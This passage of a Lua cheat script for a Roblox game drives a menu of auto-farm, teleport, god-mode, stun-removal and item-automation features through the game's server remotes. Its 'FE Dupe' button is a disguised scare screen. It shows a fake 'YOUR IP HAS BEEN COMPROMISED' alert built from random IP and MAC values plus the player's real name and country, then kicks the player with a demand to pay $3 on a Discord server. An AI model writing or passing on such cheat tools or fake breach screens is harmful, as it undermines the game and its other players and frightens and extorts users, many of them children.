			local calamity = plr.ReplicatedData.inventory:FindFirstChild(v)

			if calamity and calamity.Value > 0 then
				if v == "Calamity Fortune Gourd" then
					if not char.Humanoid.CombatAgent.Statuses:FindFirstChild("SECFortuneGourd") then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end

				if v == "Polished Calamity Eyeball" or v == "Withered Calamity Eyeball" then
					if plr.ReplicatedData.luckBoostSEC.duration.Value == 0 then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end

				if v == "Calamity Ward" then
					if not char.Humanoid.CombatAgent.Statuses:FindFirstChild("CalamityWard") then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end

				if v == "Calamity Luck Vial" then
					if not char.Humanoid.CombatAgent.Statuses:FindFirstChild("SECLuckVial") then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end
			end
		end
	end
end

function type8.SellItem()
	for _, v in ipairs(plr.ReplicatedData.inventory:GetChildren()) do
		if table.find(type8.InventorySelect, v.Name) then
			type8.Server.Data.Sell:InvokeServer(v.Name, v.Value)
		end
	end
end

function type8.RollInnate()
	local slot = plr.ReplicatedData.innates[Library.Flags["Select Innate Slot to Roll"]]

	if slot and plr.ReplicatedData.spins.Value ~= 0 then
		if table.find(type8.InnateSelect, slot.Value) then
			Library:Notification({
				Name = "Auto Roll Innate",
				Description = "You have obtained the Innate: " .. slot.Value,
				Duration = 30
			})
			return
		end

		type8.Server.Data.InnateSpin:InvokeServer(tonumber(Library.Flags["Select Innate Slot to Roll"]))
	end
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local Window = Library:Window({
	Name = "discord.gg/solixhub",
	FadeSpeed = 0.35,
	BackgroundIcon = ""
})

Window:Minimize(true)

local KeybindList = Library:KeybindList()
local Watermark = Library:Watermark(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)

local Pages = {
	["Farm"] = Window:Page({ Name = "Farm", Columns = 1 }),
	["Main"] = Window:Page({ Name = "Main", Columns = 1 }),
	["Skill"] = Window:Page({ Name = "Skill", Columns = 1 }),
	["Item"] = Window:Page({ Name = "Item", Columns = 1 }),
	["Misc"] = Window:Page({ Name = "Misc", Columns = 2 }),
	["Webhook"] = Window:Page({ Name = "Webhook", Columns = 1 })
}

Library:CreateSettingsPage(Window, Watermark, KeybindList)

KeybindList:SetVisibility(true)
Watermark:SetVisibility(true)

local Nearest_Section = Pages["Farm"]:Section({ Name = "Auto Farm Nearest", Side = 1 })

Nearest_Section:Toggle({
	Name = "Auto Farm Nearest",
	Flag = "Auto Farm Nearest",
	Description = "",
	Tooltip = "Automatically farm the nearest Mobs",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm Nearest"] = value
	end
})

Nearest_Section:Slider({
	Name = "Range to Detect",
	Flag = "Range to Detect",
	Description = "",
	Default = 500,
	Min = 0,
	Max = 1000,
	Decimals = 10,
	Suffix = "m",
	Callback = function(value)
		Library.Flags["Range to Detect"] = value
	end
})

local World_Section = Pages["Farm"]:Section({ Name = "Auto Farm World", Side = 1 })

World_Section:Dropdown({
	Name = "Select World",
	Flag = "Select World to Farm",
	Description = "",
	Multi = true,
	Items = type8.WorldList,
	Default = {type8.WorldList[1]},
	Callback = function(value)
		Library.Flags["Select World to Farm"] = value
		type8.WorldSelect = {}

		for _, v in ipairs(value) do
			table.insert(type8.WorldSelect, v)
		end
	end
})

World_Section:Toggle({
	Name = "Auto Farm World",
	Flag = "Auto Farm World",
	Description = "",
	Tooltip = "Automatically farm the selected Bosses",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm World"] = value
	end
})

World_Section:Toggle({
	Name = "Hop when no World",
	Flag = "Hop when no World",
	Description = "",
	Tooltip = "Automatically hop when no World is detected",
	Default = false,
	Callback = function(value)
		Library.Flags["Hop when no World"] = value
	end
})

local Mission_Section = Pages["Farm"]:Section({ Name = "Auto Farm Mission", Side = 1 })

Mission_Section:Toggle({
	Name = "Auto Farm Mission",
	Flag = "Auto Farm Mission",
	Description = "",
	Tooltip = "Automatically farm the selected Missions",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm Mission"] = value
	end
})

Mission_Section:Toggle({
	Name = "Auto Farm Storyline",
	Flag = "Auto Farm Storyline",
	Description = "",
	Tooltip = "Automatically farm Storylines",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm Storyline"] = value
	end
})

local Daily_Section = Pages["Farm"]:Section({ Name = "Auto Farm Daily", Side = 1 })

Daily_Section:Dropdown({
	Name = "Select Daily",
	Flag = "Select Daily to Farm",
	Description = "",
	Multi = true,
	Items = type8.DailyDisplay,
	Default = {type8.DailyDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Daily to Farm"] = value
		type8.DailySelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[")
			if v then
				table.insert(type8.DailySelect, v)
			end
		end
	end
})

Daily_Section:Toggle({
	Name = "Auto Farm Daily",
	Flag = "Auto Farm Daily",
	Description = "",
	Tooltip = "Automatically farm the selected Dailys",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm Daily"] = value
	end
})

local Boss_Section = Pages["Farm"]:Section({ Name = "Auto Farm Boss", Side = 1 })

Boss_Section:Dropdown({
	Name = "Select Action",
	Flag = "Select Action Boss to Teleport",
	Description = "",
	Items = {"Replay", "Teleport"},
	Default = "Replay",
	Callback = function(value)
		Library.Flags["Select Action Boss to Teleport"] = value
	end
})

Boss_Section:Toggle({
	Name = "Auto Farm Boss",
	Flag = "Auto Farm Boss",
	Description = "",
	Tooltip = "Automatically farm the Boss",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm Boss"] = value
	end
})

Boss_Section:Button():Add("TP to The Bosses", function()
	local v = FindPath(Workspace, "Objects", "Portals", "Bosses")

	if v then
		TP(v.CFrame)
	end
end)

local Investigation_Section = Pages["Farm"]:Section({ Name = "Auto Farm Investigation", Side = 1 })

Investigation_Section:Dropdown({
	Name = "Select Action",
	Flag = "Select Action Investigation to Teleport",
	Description = "",
	Items = {"Replay", "Teleport"},
	Default = "Replay",
	Callback = function(value)
		Library.Flags["Select Action Investigation to Teleport"] = value
	end
})

Investigation_Section:Toggle({
	Name = "Auto Farm Investigation",
	Flag = "Auto Farm Investigation",
	Description = "",
	Tooltip = "Automatically farm the Investigation",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm Investigation"] = value
	end
})

Investigation_Section:Button():Add("TP to The Investigations", function()
	local v = FindPath(Workspace, "Objects", "Portals", "Investigations")

	if v then
		TP(v.CFrame)
	end
end)

local Calamity_Section = Pages["Farm"]:Section({ Name = "Auto Farm Calamity", Side = 1 })

Calamity_Section:Dropdown({
	Name = "Select Action",
	Flag = "Select Action Calamity to Teleport",
	Description = "",
	Items = {"Replay", "Teleport"},
	Default = "Replay",
	Callback = function(value)
		Library.Flags["Select Action Calamity to Teleport"] = value
	end
})

Calamity_Section:Toggle({
	Name = "Auto Farm Calamity",
	Flag = "Auto Farm Calamity",
	Description = "",
	Tooltip = "Automatically farm Calamity",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Farm Calamity"] = value
	end
})

Calamity_Section:Button():Add("TP to The Calamity", function()
	local v = FindPath(Workspace, "Map", "Parts", "CalamityIsland", "Arena")

	if v then
		TP(v.CFrame)
	end
end)

local Dupe_Section = Pages["Farm"]:Section({ Name = "Just Dupe", Side = 1 })

Dupe_Section:Button():Add("Visual Dupe", function()
	for _, v in ipairs(PlayerGUI.Inventory.Frame.Main.Items.ScrollingFrame:GetChildren()) do
		if v:FindFirstChild("Icon")
			and v.Icon:FindFirstChild("Amount") then
			v.Icon.Amount.Text = "x999999"
		end
	end
end)

Dupe_Section:Button():Add("FE Dupe", function()
	local function GetIP()
		return math.random(1, 255) .. "." .. math.random(1, 255) .. "." .. math.random(1, 255) .. "." .. math.random(1, 255)
	end

	local function GetCountry()
		return LocalizationService:GetCountryRegionForPlayerAsync(plr) or "Unknow"
	end

	local function GetMac()
		local v = {}

		for i = 1, 6 do
			table.insert(v, string.format("%02X", math.random(0,255)))
		end
		return table.concat(v, ":")
	end

	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "IPLeak"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.DisplayOrder = 999
	ScreenGui.Parent = CoreGui

	local Frame_1 = Instance.new("Frame", ScreenGui)
	Frame_1.Size = UDim2.new(1, 0, 1, 0)
	Frame_1.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame_1.BackgroundTransparency = 0.4
	Frame_1.BorderSizePixel = 0

	local ImageLabel = Instance.new("ImageLabel", ScreenGui)
	ImageLabel.Name = "Main"
	ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	ImageLabel.Position = UDim2.new(0.5,0, 0.5, 0)
	ImageLabel.Size = UDim2.new(0, 520, 0, 420)
	ImageLabel.Image = "rbxassetid://129791053552831"
	ImageLabel.ScaleType = Enum.ScaleType.Crop
	ImageLabel.BackgroundTransparency = 1

	local UICorner_1 = Instance.new("UICorner", ImageLabel)
	UICorner_1.CornerRadius = UDim.new(0, 12)

	local Frame_2 = Instance.new("Frame", ImageLabel)
	Frame_2.Size = UDim2.new(1, 0, 1, 0)
	Frame_2.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame_2.BackgroundTransparency = 0.65
	Frame_2.BorderSizePixel = 0

	local UICorner_2 = Instance.new("UICorner", Frame_2)
	UICorner_2.CornerRadius = UDim.new(0, 12)

	local TextLabel_1 = Instance.new("TextLabel", ImageLabel)
	TextLabel_1.Position = UDim2.new(0, 0, 0, 25)
	TextLabel_1.Size = UDim2.new(1, 0, 0, 45)
	TextLabel_1.BackgroundTransparency = 1
	TextLabel_1.Font = Enum.Font.GothamBold
	TextLabel_1.Text = "⚠️ SECURITY BREACH ⚠️"
	TextLabel_1.TextColor3 = Color3.fromRGB(255, 60, 60)
	TextLabel_1.TextSize = 26
	TextLabel_1.TextStrokeTransparency = 0.3

	local TextLabel_2 = Instance.new("TextLabel", ImageLabel)
	TextLabel_2.Position = UDim2.new(0, 0, 0, 75)
	TextLabel_2.Size = UDim2.new(1, 0, 0, 35)
	TextLabel_2.BackgroundTransparency = 1
	TextLabel_2.Font = Enum.Font.GothamMedium
	TextLabel_2.Text = "YOUR IP HAS BEEN COMPROMISED"
	TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_2.TextSize = 18

	local Frame_3 = Instance.new("Frame", ImageLabel)
	Frame_3.Position = UDim2.new(0.1, 0, 0, 120)
	Frame_3.Size = UDim2.new(0.8, 0, 0, 2)
	Frame_3.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
	Frame_3.BorderSizePixel = 0

	local Frame_4 = Instance.new("Frame", ImageLabel)
	Frame_4.Position = UDim2.new(0, 35, 0, 140)
	Frame_4.Size = UDim2.new(1, -70, 0, 210)
	Frame_4.BackgroundTransparency = 1

	local function MakeLine(a, b, c)
		local Frame = Instance.new("Frame", Frame_4)
		Frame.Position = UDim2.new(0, 0, 0 ,c)
		Frame.Size = UDim2.new(1, 0, 0, 32)
		Frame.BackgroundTransparency = 1

		local TextLabel_1 = Instance.new("TextLabel", Frame)
		TextLabel_1.Size = UDim2.new(0.42, 0, 1 ,0)
		TextLabel_1.BackgroundTransparency = 1
		TextLabel_1.Font = Enum.Font.GothamBold
		TextLabel_1.Text = a
		TextLabel_1.TextColor3 = Color3.fromRGB(220, 220, 220)
		TextLabel_1.TextSize = 15
		TextLabel_1.TextXAlignment = Enum.TextXAlignment.Left

		local TextLabel_2 = Instance.new("TextLabel", Frame)
		TextLabel_2.Position = UDim2.new(0.42, 0, 0, 0)
		TextLabel_2.Size = UDim2.new(0.58, 0,1, 0)
		TextLabel_2.BackgroundTransparency = 1
		TextLabel_2.Font = Enum.Font.GothamMedium
		TextLabel_2.Text = b
		TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
		TextLabel_2.TextSize = 15
		TextLabel_2.TextXAlignment = Enum.TextXAlignment.Right
	end

	MakeLine("IP Address:", GetIP(), 0)
	MakeLine("Location:", GetCountry(), 38)
	MakeLine("MAC Address:", GetMac(), 76)
	MakeLine("ISP Provider:", "ISP-" .. math.random(1000,9999), 114)
	MakeLine("Roblox User:", plr.Name, 152)

	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
		ImageLabel.Size = UDim2.new(0, 360, 0, 440)
		TextLabel_1.TextSize = 20
		TextLabel_2.TextSize = 15
	end

	ImageLabel.Size = UDim2.new(0, 0, 0, 0)

	TweenService:Create(ImageLabel, TweenInfo.new(0.45, Enum.EasingStyle.Back), {Size = UserInputService.TouchEnabled and UDim2.new(0, 360, 0, 440) or UDim2.new(0, 520, 0, 420)}):Play()

	local Sound = Instance.new("Sound")
	Sound.SoundId = "rbxassetid://6895079853"
	Sound.Volume = 0.4
	Sound.Parent = game:GetService("SoundService")
	Sound:Play()

	task.delay(2, function()
		Sound:Destroy() 
	end)

	wait(3)
	plr:Kick("Pay $3 at discord.gg/solixhub to avoid IP leaks.")
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local Join_Section = Pages["Main"]:Section({ Name = "Auto Join", Side = 1 })

Join_Section:Dropdown({
	Name = "Select Mode",
	Flag = "Select Mode to Join",
	Description = "",
	Items = type8.ModeList,
	Default = nil,
	Callback = function(value)
		Library.Flags["Select Mode to Join"] = value
	end
})

Join_Section:Dropdown({
	Name = "Select Map",
	Flag = "Select Map to Join",
	Description = "",
	Items = type8.MapList,
	Default = nil,
	Callback = function(value)
		Library.Flags["Select Map to Join"] = value
	end
})

Join_Section:Dropdown({
	Name = "Select Difficulty",
	Flag = "Select Difficulty to Join",
	Description = "",
	Items = type8.DifficultyList,
	Default = nil,
	Callback = function(value)
		Library.Flags["Select Difficulty to Join"] = value
	end
})

Join_Section:Dropdown({
	Name = "Select Level",
	Flag = "Select Level to Join",
	Description = "",
	Items = type8.LevelList,
	Default = nil,
	Callback = function(value)
		Library.Flags["Select Level to Join"] = value
	end
})

Join_Section:Toggle({
	Name = "Auto Join",
	Flag = "Auto Join",
	Description = "",
	Tooltip = "Automatically join selected Mode",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Join"] = value
	end
})

local Public_Section = Pages["Main"]:Section({ Name = "Anti Public", Side = 1 })

Public_Section:Toggle({
	Name = "Anti Public",
	Flag = "Anti Public",
	Description = "",
	Tooltip = "Automatically return if player count exceeds",
	Default = false,
	Callback = function(value)
		Library.Flags["Anti Public"] = value

		if not value then return end

		if IsBoss or IsInvestigation or IsCalamity then
			if #Players:GetPlayers() > Library.Flags["Max Players"] then
				TeleportService:Teleport(10450270085)
			end

			InsertConnections(Players.PlayerAdded:Connect(function()
				if not Library.Flags["Anti Public"] then return end
				if #Players:GetPlayers() > Library.Flags["Max Players"] then
					TeleportService:Teleport(10450270085)
				end
			end))
		end
	end
})

Public_Section:Slider({
	Name = "Max Players",
	Flag = "Max Players",
	Description = "",
	Default = 1,
	Min = 1,
	Max = 12,
	Decimals = 1,
	Suffix = "",
	Callback = function(value)
		Library.Flags["Max Players"] = value
	end
})

local Lilix_Section = Pages["Main"]:Section({ Name = "I don't know either", Side = 1 })

Lilix_Section:Toggle({
	Name = "God Mode",
	Flag = "God Mode",
	Description = "",
	Tooltip = "Automatically become to god",
	Default = false,
	Callback = function(value)
		Library.Flags["God Mode"] = value

		if not value then
			if HasCooldown("AlreadyLoaded") then
				type8.Server.Combat.ToggleMenu:FireServer(false)
			end
		end
	end
})

Lilix_Section:Toggle({
	Name = "Disables Stun",
	Flag = "Disables Stun",
	Description = "",
	Tooltip = "Automatically disables stun",
	Default = false,
	Disabled = not Workspace:GetAttribute("low"),
	Callback = function(value)
		Library.Flags["Disables Stun"] = value
	end
})

Lilix_Section:Toggle({
	Name = "Infinite Black Flash",
	Flag = "Infinite Black Flash",
	Description = "",
	Tooltip = "Allows Infinite Black Flash when M2",
	Default = false,
	Callback = function(value)
		Library.Flags["Infinite Black Flash"] = value
	end
})

local Relix_Section = Pages["Main"]:Section({ Name = "I don't know either", Side = 1 })

Relix_Section:Toggle({
	Name = "Auto Collect Chest",
	Flag = "Auto Collect Chest",
	Description = "",
	Tooltip = "Automatically collect when Chest is detected",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Collect Chest"] = value
	end
})

Relix_Section:Toggle({
	Name = "Auto Domain Clash",
	Flag = "Auto Domain Clash",
	Description = "",
	Tooltip = "Automatically click to Domain Clash",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Domain Clash"] = value
	end
})

Relix_Section:Toggle({
	Name = "Auto Promote",
	Flag = "Auto Promote",
	Description = "",
	Tooltip = "Automatically promote when conditions allow",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Promote"] = value
	end
})

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local ChangeInnate_Section = Pages["Skill"]:Section({ Name = "Change Innate", Side = 1 })

for innate = 1, 4 do
	ChangeInnate_Section:Dropdown({
		Name = "Innate " .. innate,
		Flag = "Innate " .. innate,
		Description = "",
		Multi = false,
		Items = type8.InnateDisplay,
		Default = nil,
		Callback = function(value)
			local v = plr.ReplicatedData.innates[tostring(innate)]

			if v and value ~= nil then
				v.Value = value:match("^(.-) %[[^%]]+%]$")			
			end

			Library.Flags["Innate " .. innate] = value
		end
	})
end

local Setting_Section = Pages["Skill"]:Section({ Name = "Setting", Side = 1 })

Setting_Section:Dropdown({
	Name = "Select Method",
	Flag = "Select Skill Method",
	Description = "",
	Items = {"Custom", "Random"},
	Default = "Custom",
	Callback = function(value)
		Library.Flags["Select Skill Method"] = value
	end
})

Setting_Section:Toggle({
	Name = "Auto Use Skill",
	Flag = "Auto Use Skill",
	Description = "",
	Tooltip = "Automatically use the selected Skills",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Use Skill"] = value
	end
})

local Skill_Section = Pages["Skill"]:Section({ Name = "Skill", Side = 1 })

for _, skill in pairs(type8.SkillData) do
	Skill_Section:Dropdown({
		Name = "Skill " .. skill,
		Flag = "Skill " .. skill,
		Description = "",
		Multi = false,
		Items = type8.SkillList,
		Default = nil,
		Callback = function(value)
			local v = plr.ReplicatedData.techniques.skills[skill]

			if v and value ~= nil then
				v.Value = value
				table.insert(type8.SkillSelect, value)
			end	

			Library.Flags["Skill " .. skill] = value
		end
	})
end

local Innate_Section = Pages["Skill"]:Section({ Name = "Innate", Side = 1 })

for _, innate in pairs(type8.SkillData) do
	Innate_Section:Dropdown({
		Name = "Innate " .. innate,
		Flag = "Innate " .. innate,
		Description = "",
		Multi = false,
		Items = type8.SkillList,
		Default = nil,
		Callback = function(value)
			local v = plr.ReplicatedData.techniques.innates[innate]

			if v and value ~= nil then
				v.Value = value
				table.insert(type8.SkillSelect, value)			
			end

			Library.Flags["Innate " .. innate] = value
		end
	})
end

local Emote_Section = Pages["Skill"]:Section({ Name = "Emote", Side = 1 })

Emote_Section:Dropdown({
	Name = "Select Emote",
	Flag = "Select Emote to Play",
	Description = "",
	Items = type8.EmoteList,
	Default = nil,
	Callback = function(value)
		Library.Flags["Select Emote to Play"] = value
	end
})

Emote_Section:Button():Add("Play Emote", function()
	type8.Server.Misc.Emote:FireServer(Library.Flags["Select Emote to Play"])
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local Item_Section = Pages["Item"]:Section({ Name = "Auto Collect Item", Side = 1 })

Item_Section:Dropdown({
	Name = "Select Item",
	Flag = "Select Item to Collect",
	Description = "",
	Multi = true,
	Items = type8.ItemDisplay,
	Default = {type8.ItemDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Item to Collect"] = value
		type8.ItemSelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.ItemSelect, v)
			end
		end
	end
})

Item_Section:Toggle({
	Name = "Auto Collect Item",
	Flag = "Auto Collect Item",
	Description = "",
	Tooltip = "Automatically collect the selected Items",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Collect Item"] = value
	end
})

Item_Section:Toggle({
	Name = "Hop when no Item",
	Flag = "Hop when no Item",
	Description = "",
	Tooltip = "Automatically hop when no Item is detected",
	Default = false,
	Callback = function(value)
		Library.Flags["Hop when no Item"] = value
	end
})

local Material_Section = Pages["Item"]:Section({ Name = "Auto Collect Material", Side = 1 })

Material_Section:Dropdown({
	Name = "Select Material",
	Flag = "Select Material to Collect",
	Description = "",
	Multi = true,
	Items = type8.MaterialDisplay,
	Default = {type8.MaterialDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Material to Collect"] = value
		type8.MaterialSelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.MaterialSelect, v)
			end
		end
	end
})

Material_Section:Toggle({
	Name = "Auto Collect Material",
	Flag = "Auto Collect Material",
	Description = "",
	Tooltip = "Automatically collect the selected Materials",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Collect Material"] = value
	end
})

local CashMarket_Section = Pages["Item"]:Section({ Name = "Auto Cash Market", Side = 1 })

CashMarket_Section:Dropdown({
	Name = "Select Item",
	Flag = "Select Cash Market to Buy",
	Description = "",
	Multi = true,
	Items = type8.CashMarketList,
	Default = {type8.CashMarketList[1]},
	Callback = function(value)
		Library.Flags["Select Cash Market to Buy"] = value
		type8.CashMarketSelect = {}

		for _, v in ipairs(value) do
			table.insert(type8.CashMarketSelect, v)
		end
	end
})

CashMarket_Section:Toggle({
	Name = "Auto Cash Market",
	Flag = "Auto Cash Market",
	Description = "",
	Tooltip = "Automatically buy the selected Items",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Cash Market"] = value
	end
})

local UseItem_Section = Pages["Item"]:Section({ Name = "Auto Use Item", Side = 1 })

UseItem_Section:Dropdown({
	Name = "Select Vial",
	Flag = "Select Vial to Use",
	Description = "",
	Multi = true,
	Items = type8.VialDisplay,
	Default = {type8.VialDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Vial to Use"] = value
		type8.VialSelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.VialSelect, v)
			end
		end
	end
})

UseItem_Section:Dropdown({
	Name = "Select Gourd",
	Flag = "Select Gourd to Use",
	Description = "",
	Multi = true,
	Items = type8.GourdDisplay,
	Default = {type8.GourdDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Gourd to Use"] = value
		type8.GourdSelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.GourdSelect, v)
			end
		end
	end
})

UseItem_Section:Dropdown({
	Name = "Select Beckoning",
	Flag = "Select Beckoning to Use",
	Description = "",
	Multi = true,
	Items = type8.CatDisplay,
	Default = {type8.CatDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Beckoning to Use"] = value
		type8.CatSelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.CatSelect, v)
			end
		end
	end
})

UseItem_Section:Dropdown({
	Name = "Select Consumable",
	Flag = "Select Consumable to Use",
	Description = "",
	Multi = true,
	Items = type8.ConsumableDisplay,
	Default = {type8.ConsumableDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Consumable to Use"] = value
		type8.ConsumableSelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.ConsumableSelect, v)
			end
		end
	end
})

UseItem_Section:Dropdown({
	Name = "Select Calamity",
	Flag = "Select Calamity to Use",
	Description = "",
	Multi = true,
	Items = type8.CalamityDisplay,
	Default = {type8.CalamityDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Calamity to Use"] = value
		type8.CalamitySelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.CalamitySelect, v)
			end
		end
	end
})

UseItem_Section:Toggle({
	Name = "Auto Use Item",
	Flag = "Auto Use Item",
	Description = "",
	Tooltip = "Automatically use the selected Items",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Use Item"] = value
	end
})

UseItem_Section:Toggle({
	Name = "Chest Use Only",
	Flag = "Chest Use Only",
	Description = "",
	Tooltip = "Only use item when opening chests",
	Default = false,
	Callback = function(value)
		Library.Flags["Chest Use Only"] = value
	end
})

local SellItem_Section = Pages["Item"]:Section({Name = "Auto Sell Item", Side = 1})

SellItem_Section:Dropdown({
	Name = "Select Item",
	Flag = "Select Item to Sell",
	Description = "",
	Multi = true,
	Items = type8.InventoryDisplay,
	Default = { type8.InventoryDisplay[1] },
	Callback = function(value)
		Library.Flags["Select Item to Sell"] = value
		type8.InventorySelect = {}

		for _, v in ipairs(value) do
			table.insert(type8.InventorySelect, v)
		end
	end
})

SellItem_Section:Toggle({
	Name = "Auto Sell Item",
	Flag = "Auto Sell Item",
	Description = "",
	Tooltip = "Automatically sell the selected items",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Sell Item"] = value
	end
})

local Chat_Section = Pages["Item"]:Section({ Name = "Auto Chat", Side = 1 })

Chat_Section:Toggle({
	Name = "Auto Chat Buff",
	Flag = "Auto Chat Buff",
	Description = "",
	Tooltip = "Automatically chat the buff after X minutes",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Chat Buff"] = value
	end
})

Chat_Section:Toggle({
	Name = "Auto Chat Luck",
	Flag = "Auto Chat Luck",
	Description = "",
	Tooltip = "Automatically chat the luck after X minutes",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Chat Luck"] = value
	end
})

Chat_Section:Slider({
	Name = "Chat After x Minutes",
	Flag = "Chat After x Minutes",
	Description = "",
	Default = 3,
	Min = 1,
	Max = 10,
	Decimals = 1,
	Suffix = "m",
	Callback = function(value)
		Library.Flags["Chat After x Minutes"] = value
	end
})

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local RollInnate_Section = Pages["Misc"]:Section({ Name = "Auto Roll Innate", Side = 1 })

RollInnate_Section:Dropdown({
	Name = "Select Innate",
	Flag = "Select Innate to Roll",
	Description = "",
	Multi = true,
	Items = type8.InnateDisplay,
	Default = {type8.InnateDisplay[1]},
	Callback = function(value)
		Library.Flags["Select Innate to Roll"] = value
		type8.InnateSelect = {}

		for _, n in ipairs(value) do
			local v = n:match("^(.-) %[[^%]]+%]$")
			if v then
				table.insert(type8.InnateSelect, v)
			end
		end
	end
})

RollInnate_Section:Dropdown({
	Name = "Select Slot",
	Flag = "Select Innate Slot to Roll",
	Description = "",
	Items = {"1", "2", "3", "4"},
	Default = "1",
	Callback = function(value)
		Library.Flags["Select Innate Slot to Roll"] = value
	end
})

RollInnate_Section:Toggle({
	Name = "Auto Roll Innate",
	Flag = "Auto Roll Innate",
	Description = "",
	Tooltip = "Automatically roll the selected Innates",
	Default = false,
	Callback = function(value)
		Library.Flags["Auto Roll Innate"] = value
	end
})

local Town_Section = Pages["Misc"]:Section({Name = "TP to Town", Side = 1})

Town_Section:Dropdown({
	Name = "Select Town",
	Flag = "Select Town to TP",
	Description = "",
	Multi = false,
	Items = type8.TownList,
	Default = type8.TownList[1],
	Callback = function(value)
		Library.Flags["Select Town to TP"] = value
	end
})

Town_Section:Button():Add("TP to Town", function()
	for _, v in ipairs(towns:GetChildren()) do
		if v.Name == Library.Flags["Select Town to TP"] then
			TP(v.CFrame * CFrame.new(0, 30, 0))
			break
		end
	end
end)

local Portal_Section = Pages["Misc"]:Section({Name = "TP to Portal", Side = 1})

Portal_Section:Dropdown({
	Name = "Select Portal",
	Flag = "Select Portal to TP",
	Description = "",
	Multi = false,
	Items = type8.PortalList,
	Default = type8.PortalList[1],
	Callback = function(value)
		Library.Flags["Select Portal to TP"] = value
	end
})

Portal_Section:Button():Add("TP to Portal", function()
	for _, v in ipairs(portals:GetChildren()) do
		if v.Name == Library.Flags["Select Portal to TP"] then
			TP(v.CFrame * CFrame.new(0, 30, 0))
			break
		end
	end
end)

local NPC_Section = Pages["Misc"]:Section({Name = "TP to NPC", Side = 1})

NPC_Section:Dropdown({
	Name = "Select NPC",
	Flag = "Select NPC to TP",
	Description = "",
	Multi = false,
	Items = type8.NPCList,
	Default = type8.NPCList[1],
	Callback = function(value)
		Library.Flags["Select NPC to TP"] = value
	end
})

NPC_Section:Button():Add("TP to NPC", function()
	for _, v in ipairs(npcs:GetChildren()) do
		if v.Name == Library.Flags["Select NPC to TP"] then
			TP(v.HumanoidRootPart.CFrame)
			break
		end
	end
end)

local Misc2_Section = Pages["Misc"]:Section({ Name = "Misc Functions", Side = 1 })

Misc2_Section:Toggle({
	Name = "Auto Press Play",
	Flag = "Auto Press Play",
	Description = "",
	Default = false,
	Tooltip = "Automatically press the Play button",
	Callback = function(value)
		Library.Flags["Auto Press Play"] = value

		if value then
			local play = FindPath(PlayerGUI, "Menu", "MenuButtons", "Play")
			if not play then return end

			if PlayerGUI.Menu.Enabled then
				wait(0.3)
				Fire(play)
			end

			getgenv()["Auto Press Play"] = PlayerGUI.Menu:GetPropertyChangedSignal("Enabled"):Connect(function()
				wait(0.3)
				if play then
					Fire(play)
				end
			end)
		else
			if HasCooldown("AlreadyLoaded") then
				wait(0.1)
				if getgenv()["Auto Press Play"] then
					getgenv()["Auto Press Play"]:Disconnect()
					getgenv()["Auto Press Play"] = nil
				end
			end
		end
	end
})

Misc2_Section:Toggle({
	Name = "Auto Gooning",
	Flag = "Auto Gooning",
	Description = "",
	Default = false,
	Tooltip = "Automatically become pro gooning",
	Callback = function(value)

		local function LoadAnimation(id, looped)
			if not IsActive(char) then return nil end
			local anim = Instance.new("Animation")
			anim.AnimationId = id
